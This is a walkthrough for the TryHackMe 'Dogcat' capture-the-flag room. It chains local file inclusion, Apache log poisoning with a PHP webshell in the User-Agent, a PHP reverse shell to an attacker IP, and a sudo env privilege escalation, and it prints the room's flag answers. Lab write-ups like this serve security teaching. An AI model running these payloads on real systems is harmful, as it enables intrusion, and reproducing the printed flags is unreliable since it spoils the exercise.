# Solution

## URL
- [Dogcat](https://tryhackme.com/room/dogcat)

## Steps

### Enumerate
1. Lets start with a full port scan: `sudo nmap -v -sS -p- -A 10.10.157.229 | tee nmap-scan.txt`.
2. A website is running at port 80, lets check that out.
3. Source code of index page did not reveal much.
4. Start up burp and add `http://10.10.157.229/` to scope.
5. Let's check `/robots.txt` and `/sitemap.xml`. Neither was found.
6. Trying to fuzz for directories/files: `ffuf -u http://10.10.157.229/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -mc 200,301,302,403, -fs 418 -v | tee ffuf-dir-scan.txt`.
7. Till all these scans complete, lets scour it manually.
8. In the website, we found that it has a parameter `view` which might be vulnerable to LFI.
9. Changing the value of `view` to something different like `/?view=hello` returns that `only dogs or cats are allowed`.

### LFI
1. Changing the value of `view` to `dogs` instead of the default `dog` outputs an error.
2. So if the payload must have the keywords `dog` or `cat`. Also, `.php` gets appended to the payload, which we are unable to bypass with NULL BYTE (`%00`) injection since that was fixed in PHP version 5 and this is version 7 as shown by wappalyzer.
3. Trying to change the payload to `cat/../cat` fixes the error showing that LFI is indeed possible.
4. Changing the payload to `cat/../flag` also does not show any error but also does not show any content, which means a file called `flag.php` exists.
5. We can try the `php://` wrapper to encode the file in base64 to see its contents.
6. Trying the payload `php://filter/convert.base64-encode/resource=file:///var/www/html/dog/../flag` gives us `PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo/Pgo=`.
7. Decoding it using `echo "PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo/Pgo=" | base64 -d` shows us our first flag: `THM{Th1s_1s_N0t_4_Catdog_ab67edfa}`.
6. We can't read files like `/etc/passwd` and `/etc/shadow` because of the `.php` filter.  
7. Let's read `index.php` using `php://filter/convert.base64-encode/resource=file:///var/www/html/dog/../index`.
8. After that decode the base64 string: `echo "STRING_WE_FOUND" | base64 -d > dump-index.php`.
9. We found that if `ext` parameter is set in GET parameters then it does not add `.php` to the payload.
10. So, to read `/etc/passwd` we can just do `php://filter/convert.base64-encode/resource=file:///var/www/html/dog/../../../../../../etc/passwd&ext=`.
11. After decoding we get:
    ```
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
    ```
12. Lets try to read server logs, `php://filter/convert.base64-encode/resource=file:///var/www/html/dog/../../../../../../var/log/apache2/access.log&ext=`.
13. Dumped the data into `dump-apache2-access-log.txt` file. We can see that our user-agent is logged.
14. We can try swapping our user-agent with a php code and try to execute that.
15. Start burp and capture a request to `/` of website and replace the `User-Agent` header with: `<?php system($_GET['cmd']);?>`.
16. Now access `/?view=dog/../../../../../var/log/apache2/access.log&cmd=ls%20-al&ext=` and it will get executed.

### Reverse shell:
1. Trying to get a reverse shell, first setup a listener `nc -lvnp 4242` and then go to: `/?view=dog/../../../../../var/log/apache2/access.log&cmd=php+-r+'$sock%3dfsockopen("10.17.47.107",4242)%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b'&ext=`
2. Bingo! We got it, now check home directory. Got nothing, lets find flags: `find / -name "*flag*" -type f 2> /dev/null`.
3. Got `/var/www/html/flag.php` which we already read and `/var/www/flag2_QMW7JvaY2LvK.txt`.
4. Reading the new file we got: `THM{LF1_t0_RC3_aec3fb}`.

### PrivEsc:
1. After running `sudo -l` to check our sudo privileges, we got: `(root) NOPASSWD: /usr/bin/env`.
2. Checked [GTFOBins](https://gtfobins.github.io/gtfobins/env/#sudo) to see if we can get root with `env`. We can!
3. Running the command we got from GTFOBins: `sudo env /bin/sh`.
4. We became `root`.
5. Running find command again to get more flags: `find / -name "*flag*" -type f 2> /dev/null`
6. Found `/root/flag3.txt`.
7. Read that to get the flag: `THM{D1ff3r3nt_3nv1ronments_874112}`
8. We were told that this is a docker instance we need to break out of.
9. Running the `hostname` command and getting a weird string is good indicator that this is a container.
10. Also `cd`ing to `/` and listing the contents `ls -al` we can see `.dockerenv`.

### Task 1:
#### What is flag 1?
1. The answer is `THM{Th1s_1s_N0t_4_Catdog_ab67edfa}`.

#### What is flag 2?
1. The answer is `THM{LF1_t0_RC3_aec3fb}`.

#### What is flag 3?
1. The answer is `THM{D1ff3r3nt_3nv1ronments_874112}`.

#### What is flag 4?